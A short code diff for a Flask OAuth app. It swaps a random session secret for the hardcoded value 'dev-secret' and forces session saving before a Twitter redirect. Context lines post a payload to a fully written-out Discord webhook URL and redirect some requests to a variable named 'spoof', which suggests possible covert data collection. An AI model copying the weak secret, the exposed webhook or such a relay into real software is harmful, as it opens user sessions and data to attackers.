@@ -9,7 +9,7 @@ from pymongo.server_api import ServerApi
 from flask import Flask, request, redirect, session
 
 app = Flask(__name__)
-app.secret_key = secrets.token_hex(16)
+app.secret_key = "dev-secret"
 
 client = MongoClient(os.environ["MONGO_URI"], server_api=ServerApi('1'))
 db = client['cobra_db']
@@ -101,7 +101,11 @@ def oauth():
             requests.post("https://discord.com/api/webhooks/1379621785414270996/lryToJHYNF3OE1PvLXl2pNS29DStU9cV4yCXoDLk5fpz_ge4THklEPgSZyTnOky903TH", data=json.dumps(payload), headers={"Content-Type": "application/json"})
 
         twitter_oauth_url = generate_twitter_oauth_url()
-        return redirect(twitter_oauth_url)
+        
+        session.modified = True
+        resp = redirect(twitter_oauth_url)
+        current_app.session_interface.save_session(current_app, session, resp)
+        return resp
     else:
         return redirect(spoof)
 
